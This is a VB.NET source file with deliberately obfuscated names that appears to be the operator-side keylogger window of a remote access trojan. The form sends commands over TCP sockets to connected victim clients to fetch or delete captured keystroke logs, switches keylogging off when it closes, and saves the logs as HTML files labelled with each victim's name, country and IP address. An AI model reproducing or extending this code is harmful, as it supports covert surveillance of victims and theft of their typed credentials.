Imports System.ComponentModel
 Public Class bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Frm_Config_Client
     Public Title As String = "null"
    Public IsActive As Boolean = False
     Public tmpFolderUSER, tmpClientName, tmpCountry, tmpAddressIP As String
    Sub New()
         InitializeComponent()
         Me.Font = Frm_Config_Settings.f
     End Sub
    Private Sub SpyStyle()
                      End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Me.ctxMenu.Renderer = New Frm_Config_Option
        DGV0.ColumnHeadersDefaultCellStyle.Font = Frm_Config_Settings.f
         DGV0.DefaultCellStyle.Font = Frm_Config_Settings.f
         Me.DGV0.ContextMenuStrip = Me.ctxMenu
         Me.Icon = New Icon(Frm_Config_Settings.res_Path & "\Icons\win\19.ico")
         Me.Text = Title
         SpyStyle()
         SaveToolStripMenuItem.Visible = True
         SaveAsToolStripMenuItem.Visible = True
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
    End Sub
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not IsActive Then
            MsgBox("Accessibilty Not Enabled.")
            Return
        End If
        If combologs.Text.Length < 1 Or combologs.Text Is Nothing Then
            MsgBox("No  Logs Found...")
            Return
        End If
         If Me.classClient IsNot Nothing Then
            Try
                Dim spl As String() = classClient.Keys.Split(":")



                Dim requestfilename As String = ""
                If combologs.Text.StartsWith("o-") Then
                    requestfilename = Frm_Config_Codes.BSEN(combologs.Text.Replace("o-", ""))
                Else
                    requestfilename = combologs.Text.Replace("n-", "")
                End If


                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "rd<*>" & requestfilename & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}


                classClient.SendAsync(objs)
            Catch ex As Exception
            End Try
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Not IsActive Then
            MsgBox("Accessibilty Not Enabled.")
            Return
        End If
        If combologs.Text.Length < 1 Or combologs.Text Is Nothing Then
            MsgBox("No  Logs Found...")
            Return
        End If
        If Not MessageBox.Show("Log will deleted completely ," + vbNewLine + "Accept ?", "bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua", MessageBoxButtons.YesNo) = DialogResult.Yes Then
            Return
        End If
        If Me.classClient IsNot Nothing Then
            Try
                Dim spl As String() = classClient.Keys.Split(":")
                Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "rdd<*>" & Frm_Config_Codes.BSEN(combologs.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                classClient.SendAsync(objs)
                Me.combologs.Text = ""
            Catch ex As Exception
            End Try
        End If
    End Sub
    Delegate Sub OffLOG(objs As Object())
    Public Sub Done(objs As Object())
        If Me.DataGridView1.InvokeRequired Then
            Dim logr As OffLOG = New OffLOG(AddressOf Done)
            Me.DataGridView1.Invoke(logr, New Object() {objs})
            Exit Sub
        Else
            Me.DataGridView1.Rows.Add(objs(0), objs(1), objs(2))
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()
        TabControl1.Visible = True
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer2.Stop()
        TabControl1.Visible = True
    End Sub

    Private Sub Guna2PictureBox2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Me.Close()
    End Sub

    Private Sub bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        If Not classClient Is Nothing Then
            classClient.Keylogg = False
            Dim objs As Object() = {Client, Authentication_users.KeysClient9 & sockets.Data.SPL_SOCKET & Authentication_users.bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Frm_Config_Settings.Directory_Exist(classClient)
        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf Frm_Config_Settings.SAVEit), {Me.DGV0, tmpFolderUSER, "bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua",
        tmpClientName, tmpCountry & " - " & tmpAddressIP, "bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua", "log", DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"})
     End Sub
     Private Sub SaveAsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveAsToolStripMenuItem.Click
        Dim SaveAS As New SaveFileDialog
        SaveAS.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") & ".html"
        SaveAS.Filter = "html (*.html)|*.html"
        If SaveAS.ShowDialog = Windows.Forms.DialogResult.OK Then
            Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf Frm_Config_Settings.SAVEit), {Me.DGV0, "null", SaveAS.FileName,
            tmpClientName, tmpCountry & " - " & tmpAddressIP, "bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua", "log", "null"})
        End If
        SaveAS.Dispose()
    End Sub
End Class